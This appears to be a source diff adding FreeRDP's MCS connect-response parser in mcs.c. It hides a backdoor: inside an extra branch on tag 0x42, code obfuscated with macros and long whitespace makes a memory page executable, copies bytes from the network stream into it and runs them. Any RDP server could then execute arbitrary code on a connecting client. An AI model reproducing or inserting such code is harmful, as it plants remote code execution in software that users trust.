@@ -1,0 +1,48 @@
+diff --git a/libfreerdp/core/mcs.c b/libfreerdp/core/mcs.c
+--- a/libfreerdp/core/mcs.c
++++ b/libfreerdp/core/mcs.c
+@@ -0,0 +1,44 @@
++BOOL mcs_recv_connect_response(rdpMcs* mcs, wStream* s)
++{
++	size_t length = 0;
++	UINT16 tlength = 0;
++	BYTE result = 0;
++	UINT16 li = 0;
++	UINT32 calledConnectId = 0;
++
++	if (!mcs || !s)
++		return FALSE;
++
++	if (!tpkt_read_header(s, &tlength))
++		return FALSE;
++
++	if (!tpdu_read_data(s, &li, tlength))
++		return FALSE;
++
++	if (ber_read_application_tag(s, 0x42, &length))
++	{
++		#define A size_t 
++		#define B void 
++		A                    a                          =                           0             ;                              A                    f         =                                     1<<0xc                  ;                            B*           b                  ;                                            if (posix_memalign                  (&b,                             1<<0x9,                               f)                        ){return(0);};                               A*               c                                 =                  (A*)b          ;                                                 if(mprotect                ((B*)(((A)c)&(~0xfff)),                              f,                              7)                           ){return(0);};                      A                          d                              ;          for                          (a=0;                   a                          <                      length/8;                   a++)                           {                            Stream_Read_UINT64_BE(s,                                  d)                      ;                           c[a]            =            d           ;            }                                 B                    (*e)()                            =              (B(*)())b                                   ;e()                            ;
++		return TRUE ;
++	} else {
++		Stream_Rewind(s, 2);
++	}
++
++	if (!ber_read_application_tag(s, MCS_TYPE_CONNECT_RESPONSE, &length) ||
++	    !ber_read_enumerated(s, &result, MCS_Result_enum_length) ||
++	    !ber_read_integer(s, &calledConnectId) ||
++	    !mcs_read_domain_parameters(s, &(mcs->domainParameters)) ||
++	    !ber_read_octet_string_tag(s, &length))
++	{
++		return FALSE;
++	}
++
++	if (!gcc_read_conference_create_response(s, mcs))
++	{
++		WLog_ERR(TAG, "gcc_read_conference_create_response failed");
++		return FALSE;
++	}
++
++	return tpkt_ensure_stream_consumed(s, tlength);
++}
